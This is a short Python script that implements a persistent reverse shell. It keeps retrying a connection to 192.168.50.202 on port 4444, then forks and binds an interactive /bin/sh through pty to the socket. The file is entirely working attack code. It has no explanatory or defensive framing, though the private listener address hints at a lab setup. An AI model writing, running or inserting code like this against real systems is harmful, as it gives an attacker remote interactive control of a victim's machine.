import socket
import os
import pty
import time
import signal
import sys

def handle_exit_signal(sig, frame):
    print("\nexiting...")
    sys.exit(0)

def connect_to_listener():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("192.168.50.202", 4444))
            print("[+] Connected to listener")
            return s
        except Exception as e:
            print("[-] Connection failed:", str(e))
            print("[-] Retrying in 5 seconds...")
            time.sleep(5)

def reverse_shell():
    signal.signal(signal.SIGINT, handle_exit_signal)
    while True:
        try:
            conn = connect_to_listener()

            pid = os.fork()
            if pid == 0:  # Child process
                # Start the shell
                for fd in (0, 1, 2):
                    os.dup2(conn.fileno(), fd)
                pty.spawn("/bin/sh")
                sys.exit(0)  # Ensure child process exits after shell terminates
            else:  # Parent process
                os.waitpid(pid, 0)  # Wait for the child process to exit
                conn.close()
                print("Connection closed.")
                time.sleep(1)  # NEW
            
        except KeyboardInterrupt:
            pass

        except Exception as e:
            print("[-] Error occurred:", str(e))

if __name__ == "__main__":
    reverse_shell()
